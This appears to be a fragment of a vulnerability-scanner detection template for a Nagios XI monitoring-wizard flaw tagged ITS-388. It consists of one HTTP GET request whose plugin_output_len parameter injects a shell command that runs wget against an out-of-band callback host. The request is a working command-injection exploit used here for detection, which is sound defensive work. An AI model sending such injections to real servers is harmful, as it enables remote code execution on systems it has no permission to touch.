# Vulnerable: ITS-388
GET /nagiosxi/config/monitoringwizard.php?update=1&nsp={{nsp_auth}}&nextstep=3&wizard=windowswmi&check_wmic_plus_ver=1.65&ip_address=127.0.0.1&domain=127.0.0.1&username=username&password=password&plugin_output_len=9999%3bwget%20{{interactsh-url}}%3b
